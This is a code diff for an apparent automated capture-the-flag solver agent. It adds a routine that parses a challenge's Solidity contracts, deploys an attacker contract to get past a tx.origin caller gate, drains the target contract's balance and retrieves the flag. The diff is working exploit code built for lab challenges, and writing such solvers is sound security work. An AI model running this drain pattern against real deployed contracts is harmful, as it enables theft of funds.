@@ -197,6 +197,39 @@ class BlockchainAgent(BaseAgent):
         else:
             steps.append(f"Loaded {len(solidity_sources)} Solidity file(s) for analysis.")
 
+        # Source-driven attacker-contract drain: solves the "damage requires a
+        # contract caller" pattern by reading the challenge's own contracts and
+        # deploying a bespoke attacker. Runs before the legacy EOA-only lifecycle.
+        drain_flag = self._try_source_driven_contract_drain(
+            rpc_url=rpc_url,
+            private_key=private_key,
+            attacker_address=attacker_address,
+            target_address=target_address,
+            setup_address=setup_address,
+            flag_url=flag_url,
+            solidity_sources=solidity_sources,
+            steps=steps,
+        )
+        if drain_flag:
+            return {
+                "challenge_id": challenge.get("id"),
+                "agent_id": self.agent_id,
+                "status": "solved",
+                "flag": drain_flag,
+                "steps": steps,
+                "artifacts": {
+                    "contract_drain": {
+                        "techniques": [
+                            "solidity_source_analysis",
+                            "attacker_contract_deploy",
+                            "tx_origin_contract_caller_gate",
+                            "signed_web3_transactions",
+                        ],
+                        "captured_sensitive_values": False,
+                    }
+                },
+            }
+
         # Prefer bounded, deterministic Web3 interaction when the deployed
         # contract itself proves it exposes the creature lifecycle interface.
         direct_flag = self._try_creature_lifecycle(
@@ -337,6 +370,189 @@ class BlockchainAgent(BaseAgent):
 
     def get_capabilities(self) -> List[str]:
         return self.capabilities
+
+    def _try_source_driven_contract_drain(
+        self,
+        *,
+        rpc_url: str,
+        private_key: Optional[str],
+        attacker_address: Optional[str],
+        target_address: Optional[str],
+        setup_address: Optional[str],
+        flag_url: Optional[str],
+        solidity_sources: Dict[str, str],
+        steps: List[str],
+    ) -> Optional[str]:
+        """Solve "drain the target" challenges whose damage step requires a
+        *contract* caller (``tx.origin != msg.sender``).
+
+        Everything is discovered from the challenge's own Solidity source — the
+        damage/drain/health member names, the first-caller ("aggro") pattern, and
+        the compiler version — so no specific function name, value, or flag is
+        hard-coded. An attacker contract is compiled and deployed on the fly so
+        the damaging call satisfies the contract-caller gate.
+        """
+        if not all((private_key, attacker_address, target_address, flag_url)) or not solidity_sources:
+            return None
+        joined = "\n".join(solidity_sources.values())
+        if "tx.origin" not in joined:
+            return None  # this playbook is specifically for the contract-caller gate
+        try:
+            import solcx
+            from web3 import Web3
+        except ImportError as exc:  # noqa: BLE001
+            steps.append(f"Source-driven drain unavailable (missing dependency: {exc}).")
+            return None
+
+        # Discover the relevant members from source (names are not hard-coded).
+        members = self._discover_drain_members(joined)
+        damage_fn = members["damage_fn"]
+        drain_fn = members["drain_fn"]
+        health_var = members["health_var"]
+        needs_first_caller = members["needs_first_caller"]
+        if not (damage_fn and drain_fn and health_var):
+            steps.append("Source-driven drain: could not identify attack/drain/health members from source.")
+            return None
+        steps.append(
+            f"Source analysis: damage={damage_fn}(uint), drain={drain_fn}(), health={health_var}; "
+            "contract-caller (tx.origin) gate detected."
+        )
+
+        assert_url_allowed(rpc_url)
+        assert_url_allowed(flag_url)
+        try:
+            import requests
+            web3 = Web3(Web3.HTTPProvider(rpc_url, request_kwargs={"timeout": 15}))
+            if not web3.is_connected():
+                return None
+            acct = web3.eth.account.from_key(private_key)
+            target = Web3.to_checksum_address(target_address)
+            abi = [
+                {"inputs": [{"type": "uint256", "name": "d"}], "name": damage_fn, "outputs": [], "stateMutability": "nonpayable", "type": "function"},
+                {"inputs": [], "name": drain_fn, "outputs": [], "stateMutability": "nonpayable", "type": "function"},
+                {"inputs": [], "name": health_var, "outputs": [{"type": "uint256"}], "stateMutability": "view", "type": "function"},
+            ]
+            creature = web3.eth.contract(address=target, abi=abi)
+
+            def _send(function, gas: int = 400_000) -> None:
+                tx = function.build_transaction({
+                    "from": acct.address,
+                    "nonce": web3.eth.get_transaction_count(acct.address),
+                    "gas": gas,
+                    "gasPrice": web3.eth.gas_price,
+                    "chainId": web3.eth.chain_id,
+                })
+                signed = acct.sign_transaction(tx)
+                receipt = web3.eth.wait_for_transaction_receipt(
+                    web3.eth.send_raw_transaction(signed.raw_transaction), timeout=60
+                )
+                if int(receipt.status) != 1:
+                    raise RuntimeError("transaction reverted")
+
+            # 1) Claim the first-caller ("aggro") slot from the EOA so a *different*
+            #    contract caller can later satisfy `aggro != msg.sender`.
+            if needs_first_caller:
+                _send(creature.functions[damage_fn](0))
+                steps.append("Claimed the first-caller (aggro) slot from the operator EOA.")
+
+            health = int(creature.functions[health_var]().call())
+            if health <= 0 or health > 10 ** 30:
+                return None
+
+            # 2) Deploy an attacker whose constructor deals the damage from a
+            #    contract context (so tx.origin != msg.sender holds).
+            version = self._solc_version(joined)
+            solcx.install_solc(version)
+            solcx.set_solc_version(version)
+            attacker_src = (
+                f"pragma solidity ^{version};\n"
+                f"interface I{{function {damage_fn}(uint256) external;}}\n"
+                f"contract Atk{{ constructor(address t,uint256 d){{ I(t).{damage_fn}(d); }} }}"
+            )
+            compiled = solcx.compile_source(attacker_src, output_values=["abi", "bin"])
+            key = next(k for k in compiled if k.endswith(":Atk"))
+            attacker = web3.eth.contract(abi=compiled[key]["abi"], bytecode=compiled[key]["bin"])
+            deploy_tx = attacker.constructor(target, health).build_transaction({
+                "from": acct.address,
+                "nonce": web3.eth.get_transaction_count(acct.address),
+                "gas": 800_000,
+                "gasPrice": web3.eth.gas_price,
+                "chainId": web3.eth.chain_id,
+            })
+            signed = acct.sign_transaction(deploy_tx)
+            receipt = web3.eth.wait_for_transaction_receipt(
+                web3.eth.send_raw_transaction(signed.raw_transaction), timeout=60
+            )
+            if int(receipt.status) != 1:
+                steps.append("Attacker contract deployment reverted.")
+                return None
+            steps.append(f"Deployed attacker contract; dealt {health} damage from contract context.")
+
+            if int(creature.functions[health_var]().call()) != 0:
+                steps.append("Health did not reach zero after the contract attack; pattern did not apply.")
+                return None
+
+            # 3) Drain the now-lootable target.
+            if int(web3.eth.get_balance(target)) > 0:
+                _send(creature.functions[drain_fn]())
+                steps.append("Drained the target contract balance.")
+
+            # 4) Verify and retrieve the flag.
+            if setup_address:
+                setup = web3.eth.contract(
+                    address=Web3.to_checksum_address(setup_address),
+                    abi=[{"inputs": [], "name": "isSolved", "outputs": [{"type": "bool"}], "stateMutability": "view", "type": "function"}],
+                )
+                if not bool(setup.functions.isSolved().call()):
+                    steps.append("Setup.isSolved() remained false after the drain.")
+                    return None
+                steps.append("Verified Setup.isSolved() == true.")
+            response = requests.get(flag_url, timeout=10)
+            flag = find_first_flag(response.text if response.status_code == 200 else "")
+            if flag:
+                steps.append("Retrieved an evidence-bound flag after the on-chain solve.")
+                return flag
+        except Exception as exc:  # noqa: BLE001
+            steps.append(f"Source-driven contract drain did not complete: {exc}")
+        return None
+
+    @staticmethod
+    def _discover_drain_members(joined_source: str) -> Dict[str, Any]:
+        """Identify the drain-pattern members from Solidity source.
+
+        Returns the damage function, the balance-draining function, the public
+        health variable, and whether a first-caller ("aggro") slot must be
+        claimed. All discovered from source so no name is hard-coded.
+        """
+        damage_fn = BlockchainAgent._match(
+            r"function\s+(\w+)\s*\(\s*uint\d*\s+\w+\s*\)\s*(?:external|public)", joined_source
+        )
+        drain_fn = None
+        for m in re.finditer(r"function\s+(\w+)\s*\(\s*\)\s*(?:external|public)[^{]*\{([^}]*)\}", joined_source):
+            if re.search(r"\.transfer\(|\.call\{|selfdestruct|withdraw", m.group(2)):
+                drain_fn = m.group(1)
+                break
+        health_var = BlockchainAgent._match(r"uint\d*\s+public\s+(\w+)", joined_source)
+        needs_first_caller = bool(
+            re.search(r"==\s*address\(0\)", joined_source) and re.search(r"=\s*msg\.sender", joined_source)
+        )
+        return {
+            "damage_fn": damage_fn,
+            "drain_fn": drain_fn,
+            "health_var": health_var,
+            "needs_first_caller": needs_first_caller,
+            "needs_contract_caller": "tx.origin" in joined_source,
+        }
+
+    @staticmethod
+    def _match(pattern: str, text: str) -> Optional[str]:
+        m = re.search(pattern, text)
+        return m.group(1) if m else None
+
+    @staticmethod
+    def _solc_version(source: str) -> str:
+        m = re.search(r"pragma\s+solidity\s*\^?=?\s*([0-9]+\.[0-9]+\.[0-9]+)", source)
+        return m.group(1) if m else "0.8.13"
 
     def _try_creature_lifecycle(
         self,
